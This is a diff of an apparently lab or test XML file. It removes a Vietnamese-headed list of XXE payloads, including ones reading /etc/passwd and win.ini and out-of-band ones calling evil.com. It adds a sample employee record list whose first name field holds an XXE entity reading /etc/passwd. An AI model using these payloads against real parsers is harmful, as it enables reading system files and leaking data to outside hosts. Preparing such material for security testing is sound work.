@@ -1,17 +1,30 @@
-# Payloads XXE phổ biến
-<?xml version="1.0" ?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<foo>&xxe;</foo>
 
-<?xml version="1.0" ?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
-<foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<employees>
+  <employee>
+    <name>&xxe;</name>
+    <email>mike.wheeler@example.com</email>
+    <position>Manager</position>
+    <salary>7400</salary>
+  </employee>
+  <employee>
+    <name>Dustin Henderson</name>
+    <email>the.henderson@example.com</email>
+    <position>Designer</position>
+    <salary>4300</salary>
+  </employee>
+  <employee>
+    <name>Will Byers</name>
+    <email>will.byers@example.com</email>
+    <position>Developer</position>
+    <salary>6200</salary>
+  </employee>
+  <employee>
+    <name>Lucas Sinclair</name>
+    <email>lucas.sinclair@example.com</email>
+    <position>Pentester</position>
+    <salary>5100</salary>
+  </employee>
+</employees>
 
-<?xml version="1.0" ?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/evil"> ]>
-<foo>&xxe;</foo>
-
-# XXE Out-Of-Band
-<?xml version="1.0" ?>
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/evil"> %xxe; ]>
-<foo>test</foo>
